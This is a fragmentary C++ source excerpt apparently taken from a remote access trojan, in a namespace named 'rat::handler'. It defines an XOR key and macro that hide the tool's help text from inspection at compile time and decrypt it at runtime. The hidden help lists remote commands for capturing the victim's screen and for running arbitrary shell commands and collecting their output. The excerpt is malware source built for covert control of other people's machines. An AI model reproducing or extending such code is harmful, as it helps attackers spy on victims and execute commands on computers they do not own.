...
#define XOR_KEY                                                                                    \
    "ksdjkgjfsdajghfjdahgajkfdhgjakfdhgjkafhdjkfadhgjfadhgjx.[as;;qw;;"                            \
    "rfhadfgjhafgjkdhgjkfda"
#define XOR_STRING(str) rat::encryption::xorEncrypt(str, XOR_KEY)

namespace rat::handler {

// compile-time ENCRYPTED_HELP_MESSAGE data
constexpr auto ENCRYPTED_HELP_MESSAGE =
    XOR_STRING("Available commands:\n"
               "  /screenshot for taking a frame of the screen, depends on ffmpeg being "
               "installed\n"
               "  /sh <timeout> command, run a shell command on a watcher thread with a "
               "timeout capture its output.\n"
...
void Handler::handleHelpCommand() {
    ...
    // decrypt in-place
    rat::encryption::xorData(reinterpret_cast<uint8_t *>(message.data()), message.size(), XOR_KEY);
...
void Handler::handleMenuCommand() {
    this->sendMessage(this->state.listDynamicTools());
}
} // namespace rat::handler
